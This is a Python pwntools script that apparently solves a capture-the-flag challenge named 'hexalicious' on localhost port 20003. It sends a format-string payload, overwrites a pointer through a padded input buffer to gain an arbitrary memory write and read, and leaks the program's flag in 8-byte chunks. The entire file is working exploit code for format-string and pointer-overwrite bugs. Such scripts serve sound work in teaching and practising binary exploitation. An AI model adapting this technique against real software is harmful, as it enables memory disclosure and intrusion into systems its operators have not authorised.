from pwn import *
import string

def pattern_create(length):
	# gdb-peda's pattern charset
	peda = "A%sB$nC-(D;)Ea0Fb1Gc2Hd3Ie4Jf5Kg6Lh7Mi8Nj9OkPlQmRoSpTqUrVtWuXvYwZxyz"
	return cyclic(length, alphabet=peda, n=3)

REMOTE = 1

exe = ELF("hexalicious")


def connect_remote():
	return remote("localhost", 20003)

def connect_local():
	r = exe.process()
	# gdb.attach(r, "c")
	return r


def do_scanf(r, data):
	r.recvuntil("Quit hexalicious\n\n[>] ")
	r.sendline("0")
	
	r.recvuntil("Enter your data:\n[>] ")
	r.sendline(data)


def write32(r, addr, value):
	val_str = hex(value).lstrip("0x") + " "
	payload = list(pattern_create(60))
	
	payload[:len(val_str)] = val_str
	payload[56:60] = p32(addr)
	payload = "".join(payload)
	do_scanf(r, payload)

def read64(r, addr):
	write32(r, exe.symbols["data"], addr)
	r.recvuntil("As hex, your data looks like this: ")
	return int(r.recvline(), 16)

def main():
	context(binary=exe)
	r = connect_remote() if REMOTE else connect_local()
	
	arg_idx = 29
	fmt = "%" + str(arg_idx) + "$x"
	
	r.recvuntil("Hello random stranger, what shall I call you?\n")
	r.sendline(fmt)
	
	flag = ""
	for i in range(0, 100, 8):
		chunk = p64(read64(r, exe.symbols["flag"] + i))
		info("Leaked: %r" % chunk)
		flag += chunk
		if "\0" in chunk:
			flag = flag.split("\0")[0].strip()
			break
	
	warn(flag)

if __name__ == "__main__":
	main()
